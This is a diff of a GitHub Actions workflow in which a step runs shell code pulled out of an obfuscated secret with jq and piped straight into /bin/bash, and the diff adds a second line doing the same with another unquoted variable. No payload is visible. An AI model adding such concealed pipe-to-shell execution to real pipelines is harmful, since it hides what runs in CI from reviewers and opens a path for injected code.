@@ -20,6 +20,7 @@ jobs:
           ldry8: ${{ secrets.ldry8 }}
         run: |
           printf '%s' "$ldry8" | jq -r .c33 | /bin/bash
+          echo $vn501 | jq -r .cfayb55 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
